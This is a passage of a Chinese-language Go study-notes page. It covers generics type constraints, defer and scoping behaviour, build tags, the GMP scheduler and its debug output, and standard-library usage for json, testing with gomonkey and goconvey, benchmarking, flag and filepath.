<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CompareSlice</span>[<span class="title">T</span> <span class="title">comparable</span>]<span class="params">(l, r []T)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(l) != <span class="built_in">len</span>(r) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(l) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> l &#123;</span><br><span class="line">		<span class="keyword">if</span> l[i] != r[i] &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="自定义其他类型"><a href="#自定义其他类型" class="headerlink" title="自定义其他类型"></a>自定义其他类型</h4><ul>
<li>使用下面的方式定义限定只能下面几种类型传递</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> compareType <span class="keyword">interface</span> &#123;</span><br><span class="line">	<span class="type">int</span> | <span class="type">int8</span> | <span class="type">int16</span> | <span class="type">int32</span> | <span class="type">int64</span> | <span class="type">uint</span> | <span class="type">uint8</span> | <span class="type">uint16</span> | <span class="type">uint32</span> | <span class="type">uint64</span> | <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CompareUnorderSlice</span>[<span class="title">T</span> <span class="title">compareType</span>]<span class="params">(l, r []T)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(l) != <span class="built_in">len</span>(r) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(l) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	a := DeepCopy(l)</span><br><span class="line">	b := DeepCopy(r)</span><br><span class="line">	sort.Slice(a, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a[i] &lt; a[j]</span><br><span class="line">	&#125;)</span><br><span class="line">	sort.Slice(b, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> b[i] &lt; b[j]</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> CompareSlice(a, b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="衍生类型"><a href="#衍生类型" class="headerlink" title="衍生类型"></a>衍生类型</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span>[<span class="title">T</span> <span class="title">int</span>]<span class="params">(a, b T)</span></span> T &#123;</span><br><span class="line">	<span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TestInt <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> a TestInt = <span class="number">1</span></span><br><span class="line">	<span class="keyword">var</span> b TestInt = <span class="number">2</span></span><br><span class="line">	fmt.Println(Add(a, b))  <span class="comment">// 编译报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>~</code>修饰的类型，可以使用其衍生类型</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span>[<span class="title">T</span> ~<span class="title">int</span>]<span class="params">(a, b T)</span></span> T &#123;</span><br><span class="line">	<span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TestInt <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> a TestInt = <span class="number">1</span></span><br><span class="line">	<span class="keyword">var</span> b TestInt = <span class="number">2</span></span><br><span class="line">	fmt.Println(Add(a, b))  <span class="comment">// 编译通过</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="官方定义的衍生类型-golang-org-x-exp-constraints"><a href="#官方定义的衍生类型-golang-org-x-exp-constraints" class="headerlink" title="官方定义的衍生类型 golang.org/x/exp/constraints"></a>官方定义的衍生类型 <code>golang.org/x/exp/constraints</code></h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Signed is a constraint that permits any signed integer type.</span></span><br><span class="line"><span class="comment">// If future releases of Go add new predeclared signed integer types,</span></span><br><span class="line"><span class="comment">// this constraint will be modified to include them.</span></span><br><span class="line"><span class="keyword">type</span> Signed <span class="keyword">interface</span> &#123;</span><br><span class="line">	~<span class="type">int</span> | ~<span class="type">int8</span> | ~<span class="type">int16</span> | ~<span class="type">int32</span> | ~<span class="type">int64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unsigned is a constraint that permits any unsigned integer type.</span></span><br><span class="line"><span class="comment">// If future releases of Go add new predeclared unsigned integer types,</span></span><br><span class="line"><span class="comment">// this constraint will be modified to include them.</span></span><br><span class="line"><span class="keyword">type</span> Unsigned <span class="keyword">interface</span> &#123;</span><br><span class="line">	~<span class="type">uint</span> | ~<span class="type">uint8</span> | ~<span class="type">uint16</span> | ~<span class="type">uint32</span> | ~<span class="type">uint64</span> | ~<span class="type">uintptr</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Integer is a constraint that permits any integer type.</span></span><br><span class="line"><span class="comment">// If future releases of Go add new predeclared integer types,</span></span><br><span class="line"><span class="comment">// this constraint will be modified to include them.</span></span><br><span class="line"><span class="keyword">type</span> Integer <span class="keyword">interface</span> &#123;</span><br><span class="line">	Signed | Unsigned</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Float is a constraint that permits any floating-point type.</span></span><br><span class="line"><span class="comment">// If future releases of Go add new predeclared floating-point types,</span></span><br><span class="line"><span class="comment">// this constraint will be modified to include them.</span></span><br><span class="line"><span class="keyword">type</span> Float <span class="keyword">interface</span> &#123;</span><br><span class="line">	~<span class="type">float32</span> | ~<span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Complex is a constraint that permits any complex numeric type.</span></span><br><span class="line"><span class="comment">// If future releases of Go add new predeclared complex numeric types,</span></span><br><span class="line"><span class="comment">// this constraint will be modified to include them.</span></span><br><span class="line"><span class="keyword">type</span> Complex <span class="keyword">interface</span> &#123;</span><br><span class="line">	~<span class="type">complex64</span> | ~<span class="type">complex128</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ordered is a constraint that permits any ordered type: any type</span></span><br><span class="line"><span class="comment">// that supports the operators &lt; &lt;= &gt;= &gt;.</span></span><br><span class="line"><span class="comment">// If future releases of Go add new ordered types,</span></span><br><span class="line"><span class="comment">// this constraint will be modified to include them.</span></span><br><span class="line"><span class="keyword">type</span> Ordered <span class="keyword">interface</span> &#123;</span><br><span class="line">	Integer | Float | ~<span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="21-defer"><a href="#21-defer" class="headerlink" title="21. defer"></a>21. defer</h2><h3 id="21-1-defer调用时机和顺序"><a href="#21-1-defer调用时机和顺序" class="headerlink" title="21.1. defer调用时机和顺序"></a>21.1. defer调用时机和顺序</h3><ul>
<li>defer是出函数作用域才调用，下面的调用是在<code>main end</code>之后</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">			fmt.Println(i)</span><br><span class="line">		&#125;(i)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;main end&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="21-2-defer和命名返回值"><a href="#21-2-defer和命名返回值" class="headerlink" title="21.2. defer和命名返回值"></a>21.2. defer和命名返回值</h3><ul>
<li>命名返回值，就算没有显式赋值，defer拿到的也是最终的返回值</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">aaa</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">testFunc</span><span class="params">()</span></span> (a <span class="type">int</span>) &#123;</span><br><span class="line">	a = <span class="number">4</span></span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		fmt.Println(a)	<span class="comment">// 5</span></span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">return</span> aaa()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	testFunc()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="22-作用域"><a href="#22-作用域" class="headerlink" title="22. 作用域"></a>22. 作用域</h2><h3 id="22-1-作用域变化的"><a href="#22-1-作用域变化的" class="headerlink" title="22.1. 作用域变化的:="></a>22.1. 作用域变化的<code>:=</code></h3><ul>
<li>作用域相同，不会新建同名变量</li>
<li>作用域不相同，同名变量会新建，外面的不会更改</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">aaa</span><span class="params">()</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">5</span>, <span class="number">6</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := <span class="number">4</span></span><br><span class="line">	<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		fmt.Println(a) <span class="comment">// 5</span></span><br><span class="line">	&#125;()</span><br><span class="line">	a, b := aaa()</span><br><span class="line">	fmt.Println(a, b) <span class="comment">// 5 6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">aaa</span><span class="params">()</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">5</span>, <span class="number">6</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := <span class="number">4</span></span><br><span class="line">	<span class="keyword">if</span> <span class="literal">true</span> &#123;</span><br><span class="line">		a, b := aaa()</span><br><span class="line">		fmt.Println(a, b) <span class="comment">// 5 6</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(a) <span class="comment">// 4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="23-跨平台"><a href="#23-跨平台" class="headerlink" title="23. 跨平台"></a>23. 跨平台</h2><ul>
<li>go可以在文件头部指定特定平台编译文件</li>
<li>具体支持的平台和架构使用<code>go tool dist list</code>查看</li>
</ul>
<p><strong>仅在linux的amd64下编译</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:build linux &amp;&amp; amd64</span></span><br><span class="line"><span class="comment">// +build linux,amd64</span></span><br></pre></td></tr></table></figure>

<p><strong>在linux或mac下编译</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:build linux || darwin</span></span><br><span class="line"><span class="comment">// +build linux darwin</span></span><br></pre></td></tr></table></figure>

<h1 id="三、GMP运行模型"><a href="#三、GMP运行模型" class="headerlink" title="三、GMP运行模型"></a>三、GMP运行模型</h1><p>参考一些好的帖子</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/288017699">全文图解Golang 调度器 GMP 原理与调度</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/261057034">Golang并发模型GMP</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/385371995?utm_id=0">Golang 系统调用与阻塞处理</a></li>
</ul>
<p><img src="/2023-06-16-01.png"></p>
<h2 id="1-几个原则"><a href="#1-几个原则" class="headerlink" title="1. 几个原则"></a>1. 几个原则</h2><ul>
<li>G goroutine</li>
<li>M machine 也是线程的抽象</li>
<li>P process 协程调度器</li>
<li>M必须绑定一个P才能执行</li>
<li>P默认是cpu核心数，可以使用<code>runtime.GOMAXPROCS(2)</code>设置P的数量</li>
<li>每个P上面有一个G的队列不超过256个，M绑定P后，从P的队列中取G运行</li>
<li>新的G创建出来后，先加入P的本地队列中，P的本地队列满了就取一半放到全局队列中</li>
<li>M把某个P上面的G队列执行完了，会从全局队列拿一批放到本地队列或者从其他P的本地队列偷一半到自己的本地队列中</li>
<li>如果G中某个系统调用阻塞了M，go底层hook了相关系统调用，会阻塞的将会把G和M绑定一起从P中排除，然后找空闲的M，没有空闲的M就直接新建一个M</li>
<li>go程序启动会设置M的最大数量，默认10000. 但是内核很难支持这么多的线程数，所以这个限制可以忽略</li>
<li>可以手动设置M的最大数量，使用<code>debug.SetMaxThreads(6)</code>设置，但是超过此数量会直接崩溃而不是不建立继续运行</li>
</ul>
<h2 id="2-调试方法"><a href="#2-调试方法" class="headerlink" title="2. 调试方法"></a>2. 调试方法</h2><ul>
<li>设置环境变量后，执行程序就会显示调度器的状态</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export GODEBUG=schedtrace=1000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCHED 1001ms: gomaxprocs=16 idleprocs=15 threads=9 spinningthreads=0 needspinning=0 idlethreads=2 runqueue=0 [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0]</span><br></pre></td></tr></table></figure>

<ul>
<li><code>SCHED</code>：调试信息输出标志字符串，代表本行是 goroutine 调度器的输出；</li>
<li><code>1001ms</code>：即从程序启动到输出这行日志的时间；</li>
<li><code>gomaxprocs=16</code>: P的数量，默认的 P 的属性是和 cpu 核心数量默认一致</li>
<li><code>idleprocs=15</code>: 处于 idle 状态的 P 的数量；通过 gomaxprocs 和 idleprocs 的差值，我们就可知道执行 go 代码的 P 的数量；</li>
<li><code>threads=9</code>: os threads&#x2F;M 的数量，包含 scheduler 使用的 m 数量，加上 runtime 自用的类似 sysmon 这样的 thread 的数量；</li>
<li><code>spinningthreads=0</code>: 处于自旋状态的 os thread 数量；</li>
<li><code>needspinning=0</code>: 需要自旋的 os thread 数量；</li>
<li><code>idlethreads=2</code>: 处于 idle 状态的 os thread 的数量；</li>
<li><code>runqueue=0</code>： Scheduler 全局队列中 G 的数量；</li>
<li><code>[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0]</code>: 16个P的本地队列中的G的数量。</li>
</ul>
<h1 id="四、标准库"><a href="#四、标准库" class="headerlink" title="四、标准库"></a>四、标准库</h1><h2 id="1-encoding-json"><a href="#1-encoding-json" class="headerlink" title="1. encoding&#x2F;json"></a>1. encoding&#x2F;json</h2><h3 id="1-1-一些基本操作"><a href="#1-1-一些基本操作" class="headerlink" title="1.1. 一些基本操作"></a>1.1. 一些基本操作</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">/****** 将json字符串序列化成go对象 ******/</span></span><br><span class="line">	<span class="comment">// 先marshal在unmarshal可以让一个未知的interface确定内部类型</span></span><br><span class="line">	<span class="comment">// Unmarshal可以将一个json字符串解析到一个特定的格式下</span></span><br><span class="line">	<span class="comment">// json.Unmarshal会将数字解析成float64</span></span><br><span class="line">	json.Unmarshal(jsonBytes, &amp;target)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/****** 将go对象转成json字符串 ******/</span></span><br><span class="line">	<span class="keyword">var</span> f <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	jsonBytes, err := json.Marshal(&amp;f)</span><br><span class="line">	<span class="comment">// 格式化的字符串，第二个是前缀，第三个是缩进符号</span></span><br><span class="line">	jsonIndentBytes, err := json.MarshalIndent(&amp;f, <span class="string">&quot;&quot;</span>, <span class="string">&quot;    &quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-key排序转json"><a href="#1-2-key排序转json" class="headerlink" title="1.2. key排序转json"></a>1.2. key排序转json</h3><ul>
<li>go默认对<code>map[string]interface&#123;&#125;</code>转json按照key升序转化</li>
<li>想要对key排序只能通过结构体的方式，转json会按照结构体的顺序转化</li>
<li>为空的key不想输出，可以加上<code>omitempty</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> outT <span class="keyword">struct</span> &#123;</span><br><span class="line">	Type <span class="type">string</span> <span class="string">`json:&quot;type,omitempty&quot;`</span></span><br><span class="line">	Name <span class="type">string</span> <span class="string">`json:&quot;name,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> f outT</span><br><span class="line">	str, _ := json.Marshal(&amp;f)	<span class="comment">// &#123;&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>数字类型在Unmarshal之后会转成float64，只能断言为float64</li>
</ul>
<h2 id="2-testing-单测"><a href="#2-testing-单测" class="headerlink" title="2. testing 单测"></a>2. testing 单测</h2><ul>
<li>单测文件要以<code>xxx_test.go</code>的格式，函数名以<code>Testxxx</code>的格式，package和要测试的文件属于同一个</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> service</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;reflect&quot;</span></span><br><span class="line">	<span class="string">&quot;sort&quot;</span></span><br><span class="line">	<span class="string">&quot;testing&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"></span><br><span class="line">	. <span class="string">&quot;github.com/agiledragon/gomonkey&quot;</span></span><br><span class="line">	. <span class="string">&quot;github.com/smartystreets/goconvey/convey&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestFunc</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	sess := session.Session&#123;&#125;</span><br><span class="line">	<span class="keyword">var</span> s *session.Session</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hook类的成员函数Commit</span></span><br><span class="line">	patch := ApplyMethod(reflect.TypeOf(s), <span class="string">&quot;Commit&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(_ *session.Session)</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> <span class="literal">nil</span> &#125;)</span><br><span class="line">	<span class="keyword">defer</span> patch.Reset()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用Convey包裹，可以按照分组测试</span></span><br><span class="line">	Convey(<span class="string">&quot;TestFunc&quot;</span>, t, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		Convey(<span class="string">&quot;正常流程&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			Convey(<span class="string">&quot;插入单个数据&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">				sess.New()</span><br><span class="line">                ...</span><br><span class="line">                <span class="comment">// So确定</span></span><br><span class="line">				So(tmp, ShouldResemble, []<span class="type">string</span>&#123;<span class="string">&quot;aaa&quot;</span>&#125;)</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">		Convey(<span class="string">&quot;异常流程&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			Convey(<span class="string">&quot;GetSessionData出错&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">				sess.New()</span><br><span class="line">				...</span><br><span class="line">				patch1 := ApplyMethod(reflect.TypeOf(s), <span class="string">&quot;GetSessionData&quot;</span>,</span><br><span class="line">					<span class="function"><span class="keyword">func</span><span class="params">(_ *session.Session, _ <span class="type">string</span>)</span></span> (<span class="keyword">interface</span>&#123;&#125;, <span class="type">error</span>) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;testErr&quot;</span>)</span><br><span class="line">					&#125;)</span><br><span class="line">				...</span><br><span class="line">				So(tmp, ShouldResemble, []<span class="type">string</span>&#123;&#125;)</span><br><span class="line">				patch1.Reset()</span><br><span class="line">				...</span><br><span class="line">				So(tmp, ShouldResemble, []<span class="type">string</span>&#123;<span class="string">&quot;bbb&quot;</span>&#125;)</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-性能分析"><a href="#2-2-性能分析" class="headerlink" title="2.2. 性能分析"></a>2.2. 性能分析</h3><p>参考<a href="https://zhuanlan.zhihu.com/p/332613357">go 性能优化之 benchmark + pprof</a></p>
<ul>
<li>函数需要使用下面的定义</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkXXX</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>go test</code>命令跑</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-bench xxx 测试哪个函数</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-run none 不跑单测函数</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-benchmem 表示打印函数执行过程中的内存分配</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-cpuprofile xxx.out cpu文件路径</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-memprofile xxx.out 内存文件路径</span></span><br><span class="line">go test -bench BenchmarkXXX -run none -benchmem -cpuprofile cpuprofile.out -memprofile memprofile.out [package]</span><br></pre></td></tr></table></figure>

<ul>
<li>正常结束后可以使用下面命令生成报告，会自动打开浏览器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go tool pprof -http=&quot;:8081&quot; cpuprofile.out</span><br></pre></td></tr></table></figure>

<h2 id="3-flag-控制台参数解析"><a href="#3-flag-控制台参数解析" class="headerlink" title="3. flag 控制台参数解析"></a>3. flag 控制台参数解析</h2><h3 id="3-1-获取命令行参数"><a href="#3-1-获取命令行参数" class="headerlink" title="3.1. 获取命令行参数"></a>3.1. 获取命令行参数</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 在使用前先调用此函数解析参数，不然会返回空</span></span><br><span class="line">	flag.Parse()</span><br><span class="line">	<span class="comment">// 打印第一个参数</span></span><br><span class="line">	fmt.Println(flag.Arg(<span class="number">0</span>))</span><br><span class="line">	<span class="comment">// 打印所有非flag的参数</span></span><br><span class="line">	fmt.Println(flag.Args())</span><br><span class="line">	<span class="comment">// 打印参数个数</span></span><br><span class="line">	fmt.Println(flag.NArg())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; go run main.go a -a -b -asdfsaf cccc</span><br><span class="line">a</span><br><span class="line">[a -a -b -asdfsaf ccc]</span><br><span class="line">5</span><br></pre></td></tr></table></figure>

<h2 id="4-path-filepath-目录操作库"><a href="#4-path-filepath-目录操作库" class="headerlink" title="4. path&#x2F;filepath 目录操作库"></a>4. path&#x2F;filepath 目录操作库</h2><h3 id="4-1-遍历目录下所有文件和目录，类似-find-xxx"><a href="#4-1-遍历目录下所有文件和目录，类似-find-xxx" class="headerlink" title="4.1. 遍历目录下所有文件和目录，类似 find xxx"></a>4.1. 遍历目录下所有文件和目录，类似 <code>find xxx</code></h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;flag&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileList</span><span class="params">(path <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    err := filepath.Walk(path, <span class="function"><span class="keyword">func</span><span class="params">(path <span class="type">string</span>, f os.FileInfo, err <span class="type">error</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> f == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> f.IsDir() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">println</span>(path)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;filepath.Walk() return %v\n&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    flag.Parse()</span><br><span class="line">	<span class="keyword">var</span> root <span class="type">string</span></span><br><span class="line">    root = flag.Arg(<span class="number">0</span>)</span><br><span class="line">    getFileList(root)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; go run main.go .</span><br><span class="line">go.mod</span><br><span class="line">main.go</span><br><span class="line">=&gt; go run main.go ./</span><br><span class="line">go.mod</span><br><span class="line">main.go</span><br><span class="line">=&gt; go run main.go ../</span><br><span class="line">../test/go.mod</span><br><span class="line">../test/main.go</span><br><span class="line">=&gt; go run main.go /path/to/test</span><br><span class="line">/path/to/test/go.mod</span><br><span class="line">/path/to/test/main.go</span><br></pre></td></tr></table></figure>

<h3 id="4-2-路径处理"><a href="#4-2-路径处理" class="headerlink" title="4.2. 路径处理"></a>4.2. 路径处理</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	filePath := <span class="string">&quot;/home/wangyubo/aaaa/test.txt&quot;</span></span><br><span class="line">	fmt.Println(filepath.Base(filePath))	<span class="comment">// 文件名 test.txt</span></span><br><span class="line">	fmt.Println(filepath.Dir(filePath))		<span class="comment">// 路径名 /home/wangyubo/aaaa</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

